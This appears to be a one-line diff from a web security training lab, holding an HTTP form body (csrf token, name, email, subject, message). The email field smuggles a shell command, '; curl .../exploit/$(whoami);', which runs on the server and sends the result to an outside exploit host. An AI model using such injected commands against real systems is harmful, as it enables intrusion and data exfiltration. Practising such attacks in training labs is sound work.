@@ -1,0 +1,1 @@
+csrf=YDzEbqBw50ofAtrmImyDaaWdKNzIviyT&name=Kiddie&email=kiddie%40test.com; curl https://ac6a1fc81f68898780f5a536015d008d.web-security-academy.net/exploit/$(whoami);&subject=Kiddie&message=hello
